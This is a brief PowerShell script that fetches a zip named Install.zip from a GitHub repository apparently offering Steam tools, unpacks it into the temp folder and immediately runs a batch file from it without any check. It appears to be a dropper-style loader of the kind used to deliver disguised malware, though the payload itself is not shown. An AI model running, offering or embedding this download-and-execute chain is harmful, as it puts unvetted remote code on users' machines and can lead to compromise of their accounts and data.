$url = "https://raw.githubusercontent.com/rizzer-sigm/steamtols/refs/heads/main/Install.zip"
$zip = "$env:TEMP\file.zip"
$folder = "$env:TEMP\extracted"

Invoke-WebRequest $url -OutFile $zip
if (-not (Test-Path $folder)) { New-Item -ItemType Directory $folder | Out-Null }
Expand-Archive $zip -DestinationPath $folder -Force
Start-Process "$folder\start.bat"
exit
